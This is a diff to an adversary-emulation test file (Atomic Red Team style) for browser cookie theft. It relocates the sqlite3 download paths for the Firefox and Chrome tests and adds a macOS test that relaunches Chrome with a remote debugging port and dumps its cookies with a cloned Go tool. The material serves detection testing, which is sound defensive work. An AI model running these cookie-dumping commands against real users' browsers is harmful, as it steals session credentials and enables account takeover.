@@ -13,20 +13,21 @@ atomic_tests:
     sqlite3_path:
       description: Path to sqlite3
       type: path
-      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
     output_file:
       description: Filepath to output cookies
       type: path
-      default: $env:temp\T1539FirefoxCookies.txt
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Sqlite3 must exist at (#{sqlite3_path})
     prereq_command: |
-      if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
-      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
   executor:
     command: |
       stop-process -name "firefox" -force -erroraction silentlycontinue
@@ -53,20 +54,21 @@ atomic_tests:
     sqlite3_path:
       description: Path to sqlite3
       type: path
-      default: $env:temp\sqlite-tools-win32-x86-3380200\sqlite3.exe
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
     output_file:
       description: Filepath to output cookies
       type: path
-      default: $env:temp\T1539ChromeCookies.txt
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
       Sqlite3 must exist at (#{sqlite3_path})
     prereq_command: |
-      if (Test-Path #{sqlite3_path}) {exit 0} else {exit 1}
+      if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "$env:temp\sqlite.zip"
-      Expand-Archive -path "$env:temp\sqlite.zip" -destinationpath "$env:temp\" -force
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
+      Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
   executor:
     command: |
       stop-process -name "chrome" -force -erroraction silentlycontinue
@@ -74,4 +76,42 @@ atomic_tests:
     cleanup_command: |
       remove-item #{output_file}
     name: powershell
+    elevation_required: false
+- name: Steal Chrome Cookies via Remote Debugging (Mac)
+  auto_generated_guid: e43cfdaf-3fb8-4a45-8de0-7eee8741d072
+  description: |-
+    The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.
+
+    If successful, this test will output a list of cookies.
+
+    Note: Chrome processes will be killed during this test.
+  
+    See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
+  supported_platforms:
+  - macos 
+  dependency_executor_name: bash
+  dependencies:
+  - description: 'Install Go'
+    prereq_command: |-
+      go version
+    get_prereq_command: |-
+      brew install go
+  - description: 'Download and compile WhiteChocolateMacademiaNut'
+    prereq_command: |-
+      /tmp/WhiteChocolateMacademiaNut/chocolate -h
+    get_prereq_command: |-
+      git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut
+      cd /tmp/WhiteChocolateMacademiaNut
+      go mod init chocolate
+      go mod tidy
+      go build
+  executor:
+    command: |-
+      killall 'Google Chrome'
+      sleep 1
+      open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
+      sleep 1
+      /tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
+    cleanup_command: rm -rf /tmp/WhiteChocolateMacademiaNut
+    name: bash
     elevation_required: false
